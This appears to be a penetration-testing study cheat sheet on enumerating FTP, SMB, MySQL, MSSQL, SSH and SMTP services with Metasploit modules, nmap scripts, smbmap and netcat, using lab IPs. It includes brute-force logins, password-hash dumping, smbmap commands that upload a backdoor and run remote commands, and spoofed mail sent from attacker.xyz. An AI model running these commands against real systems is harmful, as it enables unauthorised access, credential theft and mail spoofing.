# Service Enumeration


- Network Service Discovery. <https://attack.mitre.org/techniques/T1046/>










## FTP

auxiliary/scanner/ftp/ftp_version

auxiliary/scanner/ftp/anonymous

auxiliary/scanner/ftp/ftp_login # brute force
	set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
	set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt











## SMB
auxiliary/scanner/smb/smb_version
auxiliary/scanner/smb/smb_enumusers
auxiliary/scanner/smb/smb_enumshares
auxiliary/scanner/smb/smb_login # brute force

auxiliary/scanner/smb/pipe_auditor



`smbmap` - SMB enumeration tool

```
smbmap -u guest -p "" -d . -H [TARGET]

smbmap -u [USERNAME] -p [PASSWORD] -d . -H [TARGET]

smbmap -u [USERNAME] -p [PASSWORD] -d . -H [TARGET] -L

smbmap -u [USERNAME] -p [PASSWORD] -d . -H [TARGET] -r [DRIVE]
smbmap -u [USERNAME] -p [PASSWORD] -d . -H [TARGET] -r 'C$'

smbmap -u [USERNAME] -p [PASSWORD] -d . -H [TARGET] --upload '[LOCAL FILE]' '[DEST]'
smbmap -u [USERNAME] -p [PASSWORD] -d . -H [TARGET] --upload '/root/backdoor' 'C$\backdoor'

smbmap -u [USERNAME] -p [PASSWORD] -d . -H [TARGET] --download '[REMOTE FILE]'
smbmap -u [USERNAME] -p [PASSWORD] -d . -H [TARGET] --download  'C$\backdoor'


smbmap -u [USERNAME] -p [PASSWORD] -d . -H [TARGET] -x [COMMAND]
smbmap -u [USERNAME] -p [PASSWORD] -d . -H [TARGET] -x 'ipconfig'


```














## MySQL
auxiliary/scanner/mysql/mysql_version
auxiliary/scanner/mysql/mysql_login # brute force
	try root first: set USERNAME root


auxiliary/admin/mysql/mysql_enum # requires credentials!

auxiliary/admin/mysql/mysql_sql
	set SQL [SQL QUERY];
	


auxiliary/scanner/mysql/mysql_schemadump
auxiliary/scanner/mysql/mysql_hashdump



```
use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS 192.76.252.3
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run
```


```
use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS 192.76.252.3
set USERNAME root
set PASSWORD twinkle
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```




Just try log as `root`: `mysql -h [TARGET] -u root`
`nmap [IP] -sV -p 3306 --script=mysql-empty-password`

### nmap
```
nmap [IP] -sV -p 3306 --script=mysql-info

nmap [IP] -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"
nmap [IP] -sV -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"
nmap [IP] -sV -p 3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"
nmap [IP] -sV -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"


nmap [IP] -sV -p 3306 --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''"




# audit
# This is good to run for developers to check wheter they have configured things correctly
nmap [IP] -sV -p 3306 --script=mysql-audit --script-args="mysql-audit.user='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"


```











## MSSQL / Microsot SQL Server


auxiliary/scanner/mssql/mssql_login
auxiliary/admin/mssql/mssql_enum
auxiliary/admin/mssql/mssql_enum_sql_logins
auxiliary/admin/mssql/mssql_exec


nmap [IP] -p 1433 --script ms-sql-info
nmap [IP] -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
nmap [IP] -p 1433 --script ms-sql-brute --script-args userdb=/[path to file],passdb=[path to pass file]

















## SSH
auxiliary/scanner/ssh/ssh_version
auxiliary/scanner/ssh/ssh_login # brute force
auxiliary/scanner/ssh/ssh_enumusers # super useful!

```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.245.211.3
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```


### Get ssh banner with `nc`
`nc [IP] 22`


### Nmap
```
# Enumerate algorithms
nmap [IP] -p22 --script ssh2-enum-algos

# SSH Keys
nmap [IP] -p22 --script ssh-hostkey --script-args ssh_hostkey=full


nmap [IP] -p22 --script ssh-auth-methods --script-args="ssh.user=[USERNAME]"

```













## SMTP
auxiliary/scanner/smtp/smtp_version
auxiliary/scanner/smtp/smtp_enum # user enumeration


```
# What is the SMTP server name and banner
nmap -sV -script banner [IP]

# 1 Connect to SMTP service using netcat and retrieve the hostname of the server (domain name)
nc [IP] 25

# 2 Does user “admin” exist on the server machine?
VRFY admin@[DOMAIN]

# What commands can be used to check the supported commands/capabilities? Connect to SMTP service using telnet and check

telnet [IP]
HELO attacker.xyz
EHLO attacker.xyz



# How many of the common usernames present in the dictionary /usr/share/commix/src/txt/usernames.txt exist on the server. Use smtp-user-enum tool for this task
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t [IP]


# How many common usernames present in the dictionary /usr/share/metasploit-framework/data/wordlists/unix_users.txt exist on the server. Use suitable metasploit module for this task

use auxiliary/scanner/smtp/smtp_enum
set RHOSTS [IP]
exploit

```



### Connect to SMTP service using telnet and send a fake mail to root user
(Note: There is a dot(.) in the last line which indicates the termination of data)

```
telnet [IP] 25
HELO attacker.xyz
mail from: admin@attacker.xyz
rcpt to:root@openmailbox.xyz
data
Subject: Hi Root
Hello,
This is a fake mail sent using telnet command.
From,
Admin
.
```


### Send a fake mail to root user using sendemail command
```
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s 192.26.29.3 -u Fakemail -m "Hi root, a fake from admin" -o tls=no


```


See:
- Postfix (http://www.postfix.org/)
- smtp-user-enum (https://tools.kali.org/information-gathering/smtp-user-enum)
- sendmail (http://www.postfix.org/sendmail.1.html)
- Metasploit Module: SMTP User Enumeration Utility https://www.rapid7.com/db/modules/auxiliary/scanner/smtp/smtp_enum



















